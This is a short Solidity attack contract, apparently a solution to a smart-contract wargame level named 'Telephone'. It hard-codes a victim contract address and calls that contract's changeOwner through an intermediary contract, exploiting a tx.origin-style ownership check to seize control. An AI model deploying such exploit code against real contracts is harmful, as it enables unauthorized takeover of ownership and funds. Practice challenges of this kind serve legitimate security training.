// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract TelephoneAttack {

  Telephone public victimContract;

  constructor() public {
    // Change addr to your victim's deployed contract location.
    victimContract = Telephone(0xd3eD8c00Acc1E8fE94716ACBF223A2F562C81eFb);
  }

  function changeOwner() public {
      victimContract.changeOwner(0x4545c437d127B29bF0BB080DeEe97f159AB827d8);
  }
}